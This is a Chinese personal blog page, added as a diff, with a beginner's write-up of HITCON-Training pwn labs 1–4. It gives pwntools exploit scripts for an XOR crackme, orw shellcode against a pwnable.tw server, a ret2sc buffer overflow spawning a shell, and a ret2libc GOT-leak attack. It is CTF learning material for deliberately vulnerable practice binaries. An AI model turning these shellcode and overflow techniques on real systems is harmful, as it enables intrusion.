@@ -1,0 +1,612 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pisanbao.jpg">
+  <link rel="icon" href="/img/pisanbao.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="皮三宝">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="最近观摩了v爷爷的blog。。。外加人人人催促学pwn时提到了这玩意。。。没办法，开始一波学习。题目比较基础，适合我这种萌新入门。之前因为太着急了一直在看堆。。。前面基础没有打扎实，现在重新复习一下下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON-Training">
+<meta property="og:url" content="http://www.psbazx.com/2019/05/23/HITCON-Training/index.html">
+<meta property="og:site_name" content="皮三宝のBlog">
+<meta property="og:description" content="最近观摩了v爷爷的blog。。。外加人人人催促学pwn时提到了这玩意。。。没办法，开始一波学习。题目比较基础，适合我这种萌新入门。之前因为太着急了一直在看堆。。。前面基础没有打扎实，现在重新复习一下下。">
+<meta property="og:locale">
+<meta property="og:image" content="http://www.psbazx.com/2019/05/23/HITCON-Training/2.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/05/23/HITCON-Training/3.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/05/23/HITCON-Training/1.png">
+<meta property="article:published_time" content="2019-05-22T18:29:32.000Z">
+<meta property="article:modified_time" content="2024-07-22T01:48:17.624Z">
+<meta property="article:author" content="皮三宝">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://www.psbazx.com/2019/05/23/HITCON-Training/2.png">
+  
+  
+  
+  <title>HITCON-Training - 皮三宝のBlog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.psbazx.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pisanbao</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HITCON-Training"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-05-22 18:29" pubdate>
+          May 22, 2019 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k wörter
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 minuten
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HITCON-Training</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>最近观摩了v爷爷的blog。。。<br>外加人人人催促学pwn时提到了这玩意。。。<br>没办法，开始一波学习。<br>题目比较基础，适合我这种萌新入门。<br>之前因为太着急了一直在看堆。。。前面基础没有打扎实，现在重新复习一下下。</p>
+<a id="more"></a>
+
+<h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><p>就是个re嘛<br><img src="2.png" srcset="/img/loading.gif" lazyload alt="2"><br>让你熟悉调试器的<br>脚本直接解</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a = [<span class="hljs-number">0x07</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x55</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x5B</span>,<br>  <span class="hljs-number">0x31</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x42</span>]<br>b = <span class="hljs-string">&#x27;Do_you_know_why_my_teammate_Orange_is_so_angry???&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in range(len(b)):</span><br><span class="hljs-string">    flag += chr(ord(b[i])^a[i])</span><br><span class="hljs-string">print flag</span><br></code></pre></td></tr></table></figure>
+<h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><p>orw<br><img src="3.png" srcset="/img/loading.gif" lazyload alt="3"><br>pwnable.tw原题<br>orw_seccomp()是个类似白名单的东西<br>他限制了sys的使用<br>但是没关系，我们的目的是flag<br>用orw读就行了<br>一开始以为要自写汇编。。。但是自身汇编功底没那么猛。。。有点懵逼，后来发现shellcraft已经集成好了这玩意</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import  *<br><br><span class="hljs-attribute">p</span> = remote(&#x27;chall.pwnable.tw&#x27;,<span class="hljs-number">10001</span>)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;:&#x27;)<br><span class="hljs-attribute">shellcode</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.pushstr(<span class="hljs-string">&quot;/home/orw/flag&quot;</span>)<br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.linux.syscall(<span class="hljs-string">&quot;SYS_open&quot;</span>, &#x27;esp&#x27;)<br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.linux.syscall(<span class="hljs-string">&quot;SYS_read&quot;</span>, &#x27;eax&#x27;, &#x27;esp&#x27;, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>)<br><span class="hljs-attribute">shellcode</span> += shellcraft.i<span class="hljs-number">386</span>.linux.syscall(<span class="hljs-string">&quot;SYS_write&quot;</span>, <span class="hljs-number">1</span>, &#x27;esp&#x27;, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>)<br><span class="hljs-attribute">p</span>.send(asm(shellcode))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h2><p>ret2sc第一次在name处注入sc<br>然后gets溢出过去。<br>反编译后显示的溢出偏移位是不对的<br>一般出现这种情况都是因为程序优化，通过esp来寻址<br>看了下反汇编，果不其然。。。<br><img src="1.png" srcset="/img/loading.gif" lazyload alt="1"><br>调试即可获得偏移位</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span> =<span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./ret2sc&quot;</span>)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>sc = asm(shellcraft.sh())<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(sc)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span> + p32(<span class="hljs-number">0x0804A060</span>)<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h2><p>ret2libc<br>不知道为什么每次遇到ret2libc 我的18.04总是打不下来<br>只好用16.04了。。。</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">from</span> pwn import *<br>a = process(<span class="hljs-string">&quot;./ret2lib&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;ret2lib&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]))<br><span class="hljs-built_in">str</span> = a.recv()<br><span class="hljs-built_in">real</span> = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>[<span class="hljs-number">31</span>:<span class="hljs-number">39</span>],<span class="hljs-number">16</span>)<br><span class="hljs-keyword">print</span> <span class="hljs-built_in">real</span><br><span class="hljs-meta">#a.recvuntil(&quot;Leave some message for me :&quot;)</span><br>sys = <span class="hljs-built_in">real</span> - lib.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh = <span class="hljs-built_in">real</span> - lib.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] + lib.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-keyword">next</span>()<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(sys) + p32(sh) + p32(sh)<br>a.send(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>未完待续</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+        <a href="/tags/pwn/">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HITCON-Training</div>
+      <div>http://www.psbazx.com/2019/05/23/HITCON-Training/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Beitragsautor</div>
+          <div>皮三宝</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Veröffentlicht am</div>
+          <div>May 22, 2019</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Urheberrechtshinweis</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/05/30/qwbctf-re/" title="qwbctf re">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">qwbctf re</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/22/%E9%87%91%E9%99%B5%E6%9F%90%E9%81%93re/" title="金陵某道re">
+                        <span class="hidden-mobile">金陵某道re</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Inhaltsverzeichnis</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
